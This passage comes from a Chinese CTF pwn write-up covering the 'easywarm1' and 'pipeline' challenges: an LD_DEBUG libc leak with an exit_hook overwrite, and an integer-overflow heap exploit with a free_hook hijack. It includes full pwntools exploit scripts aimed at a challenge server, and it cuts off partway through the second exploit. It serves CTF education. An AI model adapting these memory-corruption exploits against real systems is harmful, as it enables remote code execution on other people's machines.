class="keyword">if</span> v[x][y] == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> v[x][y] != <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        v[x][y] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        action = [</span><br><span class="line">            [<span class="string">&#x27;w&#x27;</span>, x-<span class="number">1</span>, y],</span><br><span class="line">            [<span class="string">&#x27;s&#x27;</span>, x+<span class="number">1</span>, y],</span><br><span class="line">            [<span class="string">&#x27;a&#x27;</span>, x, y-<span class="number">1</span>],</span><br><span class="line">            [<span class="string">&#x27;d&#x27;</span>, x, y+<span class="number">1</span>],</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> ch, xx, yy <span class="keyword">in</span> action:</span><br><span class="line">            ans += [ch]</span><br><span class="line">            ok = dfs(ans, v, xx, yy)</span><br><span class="line">            <span class="keyword">if</span> ok:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            ans.pop()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    ok = dfs(ans, v, x0, y0)</span><br><span class="line">    <span class="keyword">return</span> ok, <span class="string">&#x27;&#x27;</span>.join(ans)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;LD_DEBUG=all&quot;</span></span><br><span class="line">sla(<span class="string">&quot;name: &quot;</span>,name)</span><br></pre></td></tr></table></figure>
<p>泄露栈地址后4字节后，配合2字节溢出覆盖 key_buf.env 低位，可以劫持环境变量到我们输入 name 的地方</p>
<p>看 wp 得知，设置环境变量 <code>LD_DEBUG=all</code>(12字节) 可以打印出 ld.so 加载库的时候的 log，因此可以得到 libc 的加载地址，效果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">13304</span>:    file=./libc<span class="number">-2.31</span>.so [<span class="number">0</span>];  needed by ./easywarm1 [<span class="number">0</span>]</span><br><span class="line"><span class="number">13304</span>:    file=./libc<span class="number">-2.31</span>.so [<span class="number">0</span>];  generating link <span class="built_in">map</span></span><br><span class="line"><span class="number">13304</span>:      dynamic: <span class="number">0x00007ffff7fbfb80</span>  base: <span class="number">0x00007ffff7dd5000</span>   size: <span class="number">0x00000000001f14d8</span></span><br><span class="line"><span class="number">13304</span>:        entry: <span class="number">0x00007ffff7dfc1f0</span>  phdr: <span class="number">0x00007ffff7dd5040</span>  phnum:                 <span class="number">14</span></span><br></pre></td></tr></table></figure>
<p>最后就是一个 libc 任意写，尝试打 exit_hook：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p rtld_lock_default_lock_recursive</span><br><span class="line">$<span class="number">1</span> = &#123;<span class="keyword">void</span> (<span class="keyword">void</span> *)&#125; <span class="number">0x7ffff7fd0150</span> &lt;rtld_lock_default_lock_recursive&gt;</span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x7ffff7fd0150</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>P\x01\xfd\xf7\xff\x7f\x00\x00<span class="number">&#x27;</span></span><br><span class="line">ld<span class="number">-2.31</span>.so      <span class="number">0x7ffff7ffdf68</span> <span class="number">0x7ffff7fd0150</span></span><br></pre></td></tr></table></figure>
<p>PS：从 wp 中学到的，打 <code>__libc_atexit</code> 也是个不错的选择</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                               __libc_atexit segment qword <span class="keyword">public</span> <span class="string">&#x27;DATA&#x27;</span> use64</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                               assume cs:__libc_atexit</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                               ;org <span class="number">1</span>ED608h</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608 E0 <span class="number">5</span>E <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_1ED608 dq offset fcloseall_0        ; DATA XREF: sub_49930+<span class="number">1</span>DA↑o</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                                                                       ; sub_5EED0+<span class="number">1672</span>↑o</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                                                                       ; sub_5EED0+<span class="number">1E37</span>↑o</span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./easywarm1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([challenge,<span class="string">&quot;000&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x180A)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;[-]&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">num,size</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot; complexity: &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line">    sla(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>(<span class="params">data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;input: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span>():</span></span><br><span class="line">    cmd(<span class="number">0x666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">v</span>):</span></span><br><span class="line">    v = [<span class="string">&#x27;0&#x27;</span> * <span class="built_in">len</span>(v[<span class="number">0</span>])] + v + [<span class="string">&#x27;0&#x27;</span> * <span class="built_in">len</span>(v[<span class="number">0</span>])]</span><br><span class="line">    v = [<span class="string">&#x27;0&#x27;</span> + i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> v]</span><br><span class="line">    v = [<span class="built_in">list</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> v]</span><br><span class="line"></span><br><span class="line">    x0, y0 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v[<span class="number">0</span>])):</span><br><span class="line">            <span class="keyword">if</span> v[x][y] == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                x0, y0 = x, y</span><br><span class="line">    v[x0][y0] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">    ans = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">ans, v, x, y</span>):</span></span><br><span class="line">        <span class="keyword">if</span> v[x][y] == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> v[x][y] != <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        v[x][y] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        action = [</span><br><span class="line">            [<span class="string">&#x27;w&#x27;</span>, x-<span class="number">1</span>, y],</span><br><span class="line">            [<span class="string">&#x27;s&#x27;</span>, x+<span class="number">1</span>, y],</span><br><span class="line">            [<span class="string">&#x27;a&#x27;</span>, x, y-<span class="number">1</span>],</span><br><span class="line">            [<span class="string">&#x27;d&#x27;</span>, x, y+<span class="number">1</span>],</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> ch, xx, yy <span class="keyword">in</span> action:</span><br><span class="line">            ans += [ch]</span><br><span class="line">            ok = dfs(ans, v, xx, yy)</span><br><span class="line">            <span class="keyword">if</span> ok:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            ans.pop()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    ok = dfs(ans, v, x0, y0)</span><br><span class="line">    <span class="keyword">return</span> ok, <span class="string">&#x27;&#x27;</span>.join(ans)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;LD_DEBUG=all&quot;</span></span><br><span class="line">sla(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">28</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">maze = []</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    data = ru(<span class="string">&quot;\n&quot;</span>)[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line">    data = re.sub(<span class="string">&quot;🚩&quot;</span>,<span class="string">&quot;7&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;👴&quot;</span>,<span class="string">&quot;3&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;  &quot;</span>,<span class="string">&quot;1&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;██&quot;</span>,<span class="string">&quot;0&quot;</span>,data)</span><br><span class="line">    maze.append(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> maze:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">ok,ans = solve(maze)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ans)&gt;<span class="number">96</span>:</span><br><span class="line">    exit()</span><br><span class="line">challenge(ans)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;flag: &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">96</span>+p16(leak_addr+<span class="number">136</span>)</span><br><span class="line">challenge(payload)</span><br><span class="line"></span><br><span class="line">magic()</span><br><span class="line">ru(<span class="string">&quot; dynamic: &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>])*<span class="number">0x10</span></span><br><span class="line">libc_base =leak_addr - <span class="number">0x1eab80</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadgets = [<span class="number">0xe6aee</span>,<span class="number">0xe6af1</span>,<span class="number">0xe6af4</span>]</span><br><span class="line">one_gadget = libc_base + one_gadgets[<span class="number">0</span>]</span><br><span class="line">exit_hook = libc_base + <span class="number">0x228f68</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">success(<span class="string">&quot;exit_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(exit_hook))</span><br><span class="line"></span><br><span class="line">offset = exit_hook - <span class="number">0xadad000</span></span><br><span class="line">success(<span class="string">&quot;offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Administrator mode&quot;</span>)</span><br><span class="line">sa(<span class="string">&quot;error?&quot;</span>,p64(offset))</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">sla(<span class="string">&quot;to record?&quot;</span>,p64(one_gadget)+<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pipeline: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">1660</span>ac5f889c59866adfdd8ab506d59e2951e03a, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序对 size 大小有检查：（导致不能使用 mmap 进行分配）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunkg = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">*chunkg = chunkg + <span class="number">2</span>;</span><br><span class="line">chunkg[<span class="number">1</span>] = <span class="number">0x21000</span>LL;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 &lt; *chunkg || (result = *chunkg + chunkg[<span class="number">1</span>], a1 &gt;= result) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序对 offset 也有检查：（导致 offset 不能为负数）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)chunk-&gt;offset &gt;= chunk-&gt;size || (chunk-&gt;offset &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">  chunk-&gt;offset = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>整数溢出导致堆溢出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">size2 = chunk-&gt;size - chunk-&gt;offset;</span><br><span class="line"><span class="keyword">if</span> ( size &lt;= size2 )</span><br><span class="line">  LOWORD(size2) = size;</span><br><span class="line">readn((__int64)chunk-&gt;data + (<span class="built_in">int</span>)chunk-&gt;offset, (__int16)size2);</span><br></pre></td></tr></table></figure>
<ul>
<li>chunk-&gt;offset 是 unsigned int 类型，但 readn 中将其识别为 int </li>
<li>在 <code>LOWORD(size2) = size</code> 中，4字节的 size2 只有低2字节被覆盖，可能导致堆溢出</li>
<li>如果我们输入 0x80000200（负数），程序就会进入 if 语句，但最终只有 0x200 被覆盖到 size2</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序没有 free，只有一个 realloc 可以利用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt;offset = input_num(<span class="string">&quot;offset: &quot;</span>);</span><br><span class="line">chunk-&gt;size = input_num(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">chunk-&gt;data = realloc_s(chunk-&gt;data, chunk-&gt;size);</span><br></pre></td></tr></table></figure>
<p>申请一个大堆块，然后 realloc 一个更大的堆块，配合堆风水就可以泄露 libc_base 和 heap_base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">add()<span class="comment">#0</span></span><br><span class="line">add()<span class="comment">#1</span></span><br><span class="line">add()<span class="comment">#2</span></span><br><span class="line">add()<span class="comment">#3</span></span><br><span class="line">add()<span class="comment">#4</span></span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">add()<span class="comment">#5</span></span><br><span class="line">add2(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x460</span>)</span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add2(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ebfe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add2(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add2(<span class="number">3</span>,<span class="number">0</span>,<span class="number">0x430</span>)</span><br><span class="line">add2(<span class="number">4</span>,<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x7d0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>由于程序的限制不能直接劫持 tcache，因此需要劫持程序的单链表结构，然后直接修改 free_hook 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 